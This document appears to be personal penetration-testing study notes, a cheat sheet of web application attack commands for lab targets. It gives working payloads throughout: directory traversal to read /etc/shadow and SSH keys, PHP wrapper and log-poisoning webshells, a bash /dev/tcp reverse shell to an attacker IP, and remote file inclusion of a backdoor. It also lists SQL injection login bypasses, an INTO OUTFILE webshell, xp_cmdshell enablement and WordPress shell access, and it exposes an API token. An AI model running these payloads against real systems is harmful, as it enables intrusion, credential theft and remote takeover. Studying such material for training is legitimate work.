
| [[03 Web Application#Initial Access\|Initial Access]]             | [[03 Web Application#Common Attack Vectors\|Common Attack Vectors]] | [[03 Web Application#Directory Traversal\|Directory Traversal]] | [[03 Web Application#PHP Wrappers\|PHP Wrappers]] |
| -------------------------------------------------------------- | ---------------------------------------------------------------- | ------------------------------------------------------------ | ---------------------------------------------- |
| [[03 Web Application#Local File Inclusion\|Local File Inclusion]] | [[03 Web Application#Remote File Inclusion\|Remote File Inclusion]] | [[03 Web Application#File Upload\|File Upload]]                 | [[03 Web Application#XSS\|XSS]]                   |
| [[03 Web Application#SQLi\|SQLi]]                                 | [[03 Web Application#WordPress\|WordPress]]                         | [[03 Web Application#Drupal\|Drupal]]                           | [[03 Web Application#Joomla\|Joomla]]             |
## Initial Access
```shell
# Initial Checks
- Check Apache/Nginx server version (searchsploit-able?)
- View webpage and understand the functionality/services provided
- View source code for hidden text/links
- Check robots.txt / sitemap.xml
- Add any relevant hostnames into /etc/hosts

# WhatWeb - Identify platform/service & version
kali@kali:~$ whatweb <IP>:<PORT (if needed)>

# Fast Web Analyzer
kali@kali:~$ nikto -h http://192.168.210.100:8080

# Directory Discovery
kali@kali:~$ dirbuster
kali@kali:~$ gobuster dir -u http://example.com -w /usr/share/dirbuster/wordlists/directory-list-2.3-medium.txt
kali@kali:~$ gobuster dir -u http://example.com -w /home/kali/Desktop/wordlists/seclists/Discovery/Web-Content/raft-large-files.txt # for sparse outputs
kali@kali:~$ gobuster dir -u http://example.com -w 
/home/kali/Desktop/wordlists/seclists/Discovery/Web-Content/common.txt # for hidden files (.env, etc)

# API Discovery
kali@kali:~$ gobuster dir -u http://example.com -w /usr/share/wordlists/dirb/big.txt -p pattern
# pattern can contain {GOBUSTER}/v1, {GOBUSTER}/v2
kali@kali:~$ curl -i http://example.com/users/v1

# Bruteforce login with Hydra
kali@kali:~$ hydra -L users.txt -P password.txt <IP/Domain> http-{post/get}-form "/path:name=^USER^&password=^PASS^&enter=Sign+in:Login name or password is incorrect" -V
# Use https-form-mode for HTTPS
# Check response with BurpSuite to configure /path
```
## Common Attack Vectors
```shell
# Usual Attack Vectors
- Input Field => Remote Code Execution (RCE), SQL Injection (SQLi)
- URL => Directory Traversal, Local/Remote File Exclusion
- File Upload => Web/Reverse Shell (can be .exe, .php, .lsp, .aspx, .jsp) # Refer to /usr/share/webshells
- Login/Register Form => Default/Common Credentials, Reset Password Abuse
- About Us/Team Page => First name can be valid usernames
- 
```
## Directory Traversal
- E.g. http://mountaindesserts.com/meteor/index.php?page=../../../../etc/passwd
- Use URL Encoding if needed, %2e (.), %2F (/)
- Look for interesting files:
	- /etc/passwd (User Info)
	- /etc/shadow (User Password Info)
	- /home/`<user>`/.ssh/id_rsa (SSH Key)
## PHP Wrappers
```shell
# Display inner file contents e.g. php without execution
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/resource=admin.php

# If fail, try encode to base64 first
kali@kali:~$ curl http://mountaindesserts.com/meteor/index.php?page=php://filter/convert.base64-encode/resource=admin.php

# Utilize for code execution
kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain,<?php%20echo%20system('ls');?>"

# Again, try in base64
kali@kali:~$ echo -n '<?php echo system($_GET["cmd"]);?>' | base64
PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==

kali@kali:~$ curl "http://mountaindesserts.com/meteor/index.php?page=data://text/plain;base64,PD9waHAgZWNobyBzeXN0ZW0oJF9HRVRbImNtZCJdKTs/Pg==&cmd=ls"
```
## Local File Inclusion
- Main point is executing commands remotely
- E.g. http://mountaindesserts.com/meteor/index.php?page=../../../../var/log/apache2/access.log&cmd=whoami
- Check for stored User Agents on Dashboard logs
	```php
	<?php echo system($_GET['cmd']); ?>
	```
- Reverse Shell: ``bash%20-c%20%22bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F<KALI_IP>%2F<PORT>%200%3E%261%22``
## Remote File Inclusion
1. Obtain a PHP shell
2. Host a file server
3. http://mountaidesserts.com/meteor/index.php?page=http://<KALI_IP>/simple-backdoor.php&cmd=ls
## File Upload
- Intercept upload request via BurpSuite and edit the filename parameter with "../../../../" to redirect to specific locations
	- E.g. replacing SSH files
## XSS
- Refer to 08 Intro to Web Attacks (fatal's version)
## SQLi
- Common SQLi Strings
```css
admin' or '1'='1
' or '1'='1
" or "1"="1
" or "1"="1"--
" or "1"="1"/*
" or "1"="1"#
" or 1=1
" or 1=1 --
" or 1=1 -
" or 1=1--
" or 1=1/*
" or 1=1#
" or 1=1-
") or "1"="1
") or "1"="1"--
") or "1"="1"/*
") or "1"="1"#
") or ("1"="1
") or ("1"="1"--
") or ("1"="1"/*
") or ("1"="1"#
) or '1`='1-

# can try this if all else fails
' UNION SELECT "<?php system($_GET['cmd']);?>", null, null, null, null INTO OUTFILE "/var/www/html/tmp/webshell.php" -- // #Writing into a new file
# Then navigate to here to exploit
http://192.168.45.285/tmp/webshell.php?cmd=id
```
- Refer to SecLists Fuzzing Databases
```shell
kali@kali:~$ cat /usr/share/wordlists/seclists/Fuzzing/Databases/MySQL-SQLi-Login-Bypass.fuzzdb.txt

# regex replace as many as you can with your fuzzer for best results:
# <user-fieldname> <pass-fieldname> <username>
# also try to brute force a list of possible usernames, including possile admin acct names
<username>' OR 1=1--
'OR '' = '      Allows authentication without a valid username.
<username>'--
' union select 1, '<user-fieldname>', '<pass-fieldname>' 1--
'OR 1=1--


```
- Manual Code Execution
```shell
kali@kali:~$ impacket-mssqlclient Administrator:Lab123@192.168.50.18 -windows-auth
sql> EXECUTE sp_configure 'show advanced options', 1;
sql> RECONFIGURE;
sql> EXECUTE sp_configure 'xp_cmdshell', 1;
sql> RECONFIGURE;
sql> EXECUTE xp_cmdshell 'whoami';
```
## WordPress
```shell
# Basic WPScan
kali@kali:~$ wpscan --url "target" --verbose

# Enumerate vulnerable plugins, users, therems, timthumbs
kali@kali:~$ wpscan --url "target" --enumerate vp,u,vt,tt --follow-redirection --verbose --log target.log

# Add WPScan API to get the details of vulnerabilities
kali@kali:~$ wpscan --url http://avida-eatery.org/ --api-token NjnoSGZkuWDve0fDjmmnUNb1ZnkRw6J2J1FvBsVLPkA

#Accessing Wordpress shell
http://10.10.67.245/retro/wp-admin/theme-editor.php?file=404.php&theme=90s-retro

http://10.10.67.245/retro/wp-content/themes/90s-retro/404.php

# Look at plugins and find exploits on EDB

# Try these few things (with admin dashboard):
# - Upload malicious plugin
# - Upload web shell
# - Google
```

## Drupal
```shell
kali@kali:~$ droopescan scan drupal -u http://site
```

## Joomla
```shell
kali@kali:~$ droopescan scan joomla --url http://site

# Also refer to http://github.com/ajnik/joomla-bruteforce
```